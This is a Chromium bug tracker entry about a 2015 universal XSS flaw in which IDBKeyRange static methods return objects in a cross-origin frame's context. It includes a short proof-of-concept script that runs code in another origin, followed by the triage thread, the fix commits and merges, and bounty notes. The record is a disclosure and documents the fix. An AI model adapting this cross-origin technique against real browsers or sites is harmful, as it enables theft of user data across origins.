# Security: Universal XSS using IDBKeyRange static methods

| Field | Value |
|-------|-------|
| **Issue ID** | [40082203](https://issues.chromium.org/issues/40082203) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Storage>IndexedDB |
| **Reporter** | ma...@gmail.com |
| **Assignee** | yu...@chromium.org |
| **Created** | 2015-05-31 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**  

Calling an object-returning static method with a cross-origin thing passed as |this| yields an object wrapped in the cross-origin scope. This is because FunctionCallbackInfo ends up with a cross-origin holder, and the holder acts as a creation context for the return value in blink::ScriptWrappable::wrap.

**VERSION**  

Chrome 43.0.2357.81 (Release)  

Chrome 44.0.2403.18 (Beta)  

Chrome 45.0.2414.0 (Dev)  

Chromium 45.0.2419.0 compiled today

**REPRODUCTION CASE**

<script>
var i = document.documentElement.appendChild(document.createElement('iframe'));
i.onload = function() {
IDBKeyRange.only.call(frames[0],0).constructor.constructor('alert(location)')();
}
i.src = 'data:text/html,victim';
</script>

## Attachments

- [exploit.html](attachments/exploit.html) (text/html, 255 B)

## Timeline

### in...@chromium.org (2015-05-31)

[Empty comment from Monorail migration]

### js...@chromium.org (2015-06-01)

The IDBKeyRange code doesn't do anything fancy here (no custom bindings code); this must be an issue with the bindings code handling of static constructor functions.

haraken@ can you take a look or reassign?



### js...@chromium.org (2015-06-01)

[Comment Deleted]

### js...@chromium.org (2015-06-02)

+bashi@

### ba...@chromium.org (2015-06-02)

[Empty comment from Monorail migration]

### ha...@chromium.org (2015-06-02)

shiino-san: Would you mind taking a look at this?


### pa...@chromium.org (2015-06-02)

Thank you for the report!

### cl...@chromium.org (2015-06-02)

[Empty comment from Monorail migration]

### yu...@chromium.org (2015-06-02)

[Empty comment from Monorail migration]

### ha...@chromium.org (2015-06-02)

Removing labels reserved for V8.

### bu...@chromium.org (2015-06-03)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=196373

------------------------------------------------------------------
r196373 | yukishiino@chromium.org | 2015-06-03T06:18:23.708290Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/bindings/scripts/v8_methods.py?r1=196373&r2=196372&pathrev=196373
   M http://src.chromium.org/viewvc/blink/trunk/Source/bindings/scripts/v8_types.py?r1=196373&r2=196372&pathrev=196373
   M http://src.chromium.org/viewvc/blink/trunk/Source/bindings/scripts/v8_attributes.py?r1=196373&r2=196372&pathrev=196373
   M http://src.chromium.org/viewvc/blink/trunk/Source/bindings/core/v8/V8Binding.h?r1=196373&r2=196372&pathrev=196373
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/cross-frame-access-static-operation-return-wrapper-expected.txt?r1=196373&r2=196372&pathrev=196373
   M http://src.chromium.org/viewvc/blink/trunk/Source/bindings/tests/results/core/V8TestInterface.cpp?r1=196373&r2=196372&pathrev=196373
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/security/cross-frame-access-static-operation-return-wrapper.html?r1=196373&r2=196372&pathrev=196373
   M http://src.chromium.org/viewvc/blink/trunk/Source/bindings/tests/idls/core/TestInterface.idl?r1=196373&r2=196372&pathrev=196373

binding: Supports static operations/attrs returning non-primitive types.

Correctly supports static operations/attributes which return non-primitive types, so that the returned object is associated with the caller's context, not associated with |this| which can be faked.

BUG=494640

Review URL: https://codereview.chromium.org/1163893002
-----------------------------------------------------------------

### yu...@chromium.org (2015-06-03)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-06-03)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-06-03)

[Empty comment from Monorail migration]

### pe...@chromium.org (2015-06-03)

[Empty comment from Monorail migration]

### yu...@chromium.org (2015-06-04)

IIUC, issues need to be open until merges will be done.

### in...@chromium.org (2015-06-04)

Nope, for security bugs, merges are tracked only via merge labels. Keeping the bug open hurts our queries. Thanks for fixing this.

### pe...@google.com (2015-06-04)

[Automated comment] Request affecting a post-stable build (M43), manual review required.

### pe...@google.com (2015-06-04)

Approved for M44 (branch: 2403)

### bu...@chromium.org (2015-06-04)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=196464

------------------------------------------------------------------
r196464 | yukishiino@chromium.org | 2015-06-04T06:11:34.991153Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/2403/LayoutTests/http/tests/security/cross-frame-access-static-operation-return-wrapper.html?r1=196464&r2=196463&pathrev=196464
   M http://src.chromium.org/viewvc/blink/branches/chromium/2403/Source/bindings/tests/idls/core/TestInterface.idl?r1=196464&r2=196463&pathrev=196464
   M http://src.chromium.org/viewvc/blink/branches/chromium/2403/Source/bindings/scripts/v8_methods.py?r1=196464&r2=196463&pathrev=196464
   M http://src.chromium.org/viewvc/blink/branches/chromium/2403/Source/bindings/scripts/v8_types.py?r1=196464&r2=196463&pathrev=196464
   M http://src.chromium.org/viewvc/blink/branches/chromium/2403/Source/bindings/scripts/v8_attributes.py?r1=196464&r2=196463&pathrev=196464
   M http://src.chromium.org/viewvc/blink/branches/chromium/2403/Source/bindings/core/v8/V8Binding.h?r1=196464&r2=196463&pathrev=196464
   A http://src.chromium.org/viewvc/blink/branches/chromium/2403/LayoutTests/http/tests/security/cross-frame-access-static-operation-return-wrapper-expected.txt?r1=196464&r2=196463&pathrev=196464
   M http://src.chromium.org/viewvc/blink/branches/chromium/2403/Source/bindings/tests/results/core/V8TestInterface.cpp?r1=196464&r2=196463&pathrev=196464

Merge 196373 "binding: Supports static operations/attrs returnin..."

> binding: Supports static operations/attrs returning non-primitive types.
> 
> Correctly supports static operations/attributes which return non-primitive types, so that the returned object is associated with the caller's context, not associated with |this| which can be faked.
> 
> BUG=494640
> 
> Review URL: https://codereview.chromium.org/1163893002

TBR=yukishiino@chromium.org

Review URL: https://codereview.chromium.org/1167863003
-----------------------------------------------------------------

### la...@google.com (2015-06-18)

Approved (2357)

### bu...@chromium.org (2015-06-19)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=197431

------------------------------------------------------------------
r197431 | yukishiino@chromium.org | 2015-06-19T04:49:52.961817Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/branches/chromium/2357/Source/bindings/core/v8/V8Binding.h?r1=197431&r2=197430&pathrev=197431
   A http://src.chromium.org/viewvc/blink/branches/chromium/2357/LayoutTests/http/tests/security/cross-frame-access-static-operation-return-wrapper-expected.txt?r1=197431&r2=197430&pathrev=197431
   M http://src.chromium.org/viewvc/blink/branches/chromium/2357/Source/bindings/tests/results/core/V8TestInterface.cpp?r1=197431&r2=197430&pathrev=197431
   A http://src.chromium.org/viewvc/blink/branches/chromium/2357/LayoutTests/http/tests/security/cross-frame-access-static-operation-return-wrapper.html?r1=197431&r2=197430&pathrev=197431
   M http://src.chromium.org/viewvc/blink/branches/chromium/2357/Source/bindings/tests/idls/core/TestInterface.idl?r1=197431&r2=197430&pathrev=197431
   M http://src.chromium.org/viewvc/blink/branches/chromium/2357/Source/bindings/scripts/v8_methods.py?r1=197431&r2=197430&pathrev=197431
   M http://src.chromium.org/viewvc/blink/branches/chromium/2357/Source/bindings/scripts/v8_types.py?r1=197431&r2=197430&pathrev=197431
   M http://src.chromium.org/viewvc/blink/branches/chromium/2357/Source/bindings/scripts/v8_attributes.py?r1=197431&r2=197430&pathrev=197431

Merge 196373 "binding: Supports static operations/attrs returnin..."

> binding: Supports static operations/attrs returning non-primitive types.
> 
> Correctly supports static operations/attributes which return non-primitive types, so that the returned object is associated with the caller's context, not associated with |this| which can be faked.
> 
> BUG=494640
> 
> Review URL: https://codereview.chromium.org/1163893002

TBR=yukishiino@chromium.org

Review URL: https://codereview.chromium.org/1192753003
-----------------------------------------------------------------

### ti...@google.com (2015-06-19)

@marius.mlynski - how would you like to be credited in our release notes? We'll use "Credit to Marius Mlynski" unless you tell us otherwise. 

### ti...@google.com (2015-06-19)

[Empty comment from Monorail migration]

### ti...@google.com (2015-06-19)

[Empty comment from Monorail migration]

### ma...@gmail.com (2015-06-20)

Let's have a trailing "z" in the first name: Mariusz Mlynski. Thanks.

### cl...@chromium.org (2015-09-10)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2016-06-28)

Hey Mariusz - found this old bug during a cleanup that was marked with TBD. Unsurprisingly, $7,500 for this one as well. We'll start the payment process next week.

### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/494640?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082203)*
